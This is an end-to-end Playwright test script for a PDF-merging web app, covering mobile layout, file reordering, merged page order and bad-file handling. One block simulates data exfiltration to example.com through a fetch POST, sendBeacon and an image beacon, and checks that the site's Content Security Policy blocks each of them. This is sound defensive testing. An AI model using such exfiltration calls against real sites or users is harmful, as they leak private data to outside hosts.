import { chromium, webkit, devices } from "playwright";
import { PDFDocument } from "pdf-lib";
import fs from "node:fs";
import { spawn } from "node:child_process";

// End-to-end check on emulated phones (Android Chrome, iPhone Safari/WebKit) and desktop.
// Usage: npm run build && npm run test:e2e   (or set APP_URL to test a deployed site)

const PORT = 3200;
const URL_ = process.env.APP_URL ?? `http://localhost:${PORT}`;
const OUT = new URL("./shots/", import.meta.url).pathname;
fs.mkdirSync(OUT, { recursive: true });

let server;
if (!process.env.APP_URL) {
  server = spawn("npx", ["next", "start", "-p", String(PORT)], { stdio: "ignore" });
  for (let i = 0; ; i++) {
    try { await fetch(URL_); break; } catch { if (i > 60) throw new Error("next start did not come up"); }
    await new Promise((r) => setTimeout(r, 500));
  }
}

// Each test PDF gets a distinctive page width so we can verify order after merging.
async function makePdf(name, pages, width) {
  const d = await PDFDocument.create();
  for (let i = 0; i < pages; i++) d.addPage([width, 800]);
  return { name, mimeType: "application/pdf", buffer: Buffer.from(await d.save()) };
}
const files = [await makePdf("alpha.pdf", 2, 300), await makePdf("bravo.pdf", 3, 400), await makePdf("charlie.pdf", 1, 500)];

let failures = 0;
const check = (ok, msg) => { console.log(`  ${ok ? "PASS" : "FAIL"}  ${msg}`); if (!ok) failures++; };

async function run(browserType, launchOpts, label, deviceName) {
  console.log(`\n== ${label} (${deviceName}) ==`);
  const browser = await browserType.launch(launchOpts);
  const ctx = await browser.newContext({ ...devices[deviceName], acceptDownloads: true });
  const page = await ctx.newPage();
  const errors = [];
  page.on("pageerror", (e) => errors.push(String(e)));
  page.on("console", (m) => m.type() === "error" && errors.push(m.text()));
  await page.goto(URL_);
  await page.evaluate(() => {
    window.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__csp.push(e.blockedURI + " " + e.violatedDirective));
  });

  const isMobile = !!devices[deviceName].isMobile;
  const tag = deviceName.replace(/\W+/g, "-");
  await page.screenshot({ path: `${OUT}${tag}-1-empty.png` });

  if (isMobile) {
    check(await page.getByText("Tap to choose PDFs").isVisible(), "touch copy shown");
    check(!(await page.getByText("Drop PDFs here").isVisible()), "desktop drop copy hidden");
  } else {
    check(await page.getByText("Drop PDFs here").isVisible(), "desktop drop copy shown");
  }

  await page.locator('input[type="file"]').setInputFiles(files);
  await page.locator(".list li").nth(2).waitFor();
  check((await page.locator(".list li").count()) === 3, "3 files listed");
  check(await page.getByRole("button", { name: /Merge 3 files · 6 pages/ }).isVisible(), "merge button shows totals");

  // Reorder: move alpha down one → bravo, alpha, charlie
  const tapOrClick = (loc) => (isMobile ? loc.tap() : loc.click());
  await tapOrClick(page.locator(".list li").nth(0).getByRole("button", { name: "Move down" }));
  const names = await page.locator(".list .name").allTextContents();
  check(names.join(",") === "bravo.pdf,alpha.pdf,charlie.pdf", `reorder works (${names.join(", ")})`);

  // Layout checks
  const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
  check(overflow <= 0, `no horizontal scroll (overflow ${overflow}px)`);
  if (isMobile) {
    const sizes = await page.locator(".actions button").evaluateAll((bs) => bs.map((b) => { const r = b.getBoundingClientRect(); return Math.min(r.width, r.height); }));
    check(Math.min(...sizes) >= 40, `tap targets ≥ 40px (min ${Math.min(...sizes)}px)`);
  }

  await page.locator(".filename input").fill("my-file");
  await page.screenshot({ path: `${OUT}${tag}-2-files.png`, fullPage: true });

  const [download] = await Promise.all([page.waitForEvent("download"), tapOrClick(page.getByRole("button", { name: /Merge/ }))]);
  check(download.suggestedFilename() === "my-file.pdf", `download named ${download.suggestedFilename()}`);
  const merged = await PDFDocument.load(fs.readFileSync(await download.path()));
  const widths = merged.getPages().map((p) => p.getWidth());
  check(widths.join(",") === "400,400,400,300,300,500", `merged pages in chosen order (${widths.join(",")})`);

  // CSP: try to exfiltrate to another origin, which must be blocked
  const attempts = await page.evaluate(async () => {
    const r = {};
    try { await fetch("https://example.com/upload", { method: "POST", body: "secret" }); r.fetch = "allowed"; } catch { r.fetch = "blocked"; }
    r.beacon = navigator.sendBeacon("https://example.com/b", "secret") ? "queued" : "blocked";
    await new Promise((res) => { const i = new Image(); i.onload = i.onerror = res; i.src = "https://example.com/p.gif?d=secret"; });
    await new Promise((r2) => setTimeout(r2, 300));
    r.violations = window.__csp;
    return r;
  });
  check(attempts.fetch === "blocked", "CSP blocks fetch to another site");
  check(attempts.violations.some((v) => v.includes("img-src")), "CSP blocks image beacon to another site");
  check(attempts.violations.some((v) => v.includes("connect-src")), `CSP reports connect-src violations (${attempts.violations.length} total)`);

  // Bad file handling
  await page.locator('input[type="file"]').setInputFiles([{ name: "broken.pdf", mimeType: "application/pdf", buffer: Buffer.from("not a pdf") }]);
  await page.getByText("Can't read this file").waitFor();
  check(await page.getByRole("button", { name: /Merge/ }).isDisabled(), "merge disabled with unreadable file");

  const appErrors = errors.filter((e) => !/Content Security Policy|example\.com|Refused to/i.test(e));
  check(appErrors.length === 0, `no app errors${appErrors.length ? ": " + appErrors.join(" | ") : ""}`);
  await browser.close();
}

try {
  await run(chromium, {}, "Chromium", "Pixel 7");
  await run(chromium, {}, "Chromium", "Galaxy S9+");
  await run(webkit, {}, "WebKit", "iPhone 15");
  await run(webkit, {}, "WebKit", "iPhone SE");
  await run(chromium, {}, "Chromium", "Desktop Chrome");
} finally {
  server?.kill();
}

console.log(failures ? `\n${failures} check(s) failed` : "\nAll checks passed");
console.log(`Screenshots: ${OUT}`);
process.exit(failures ? 1 : 0);
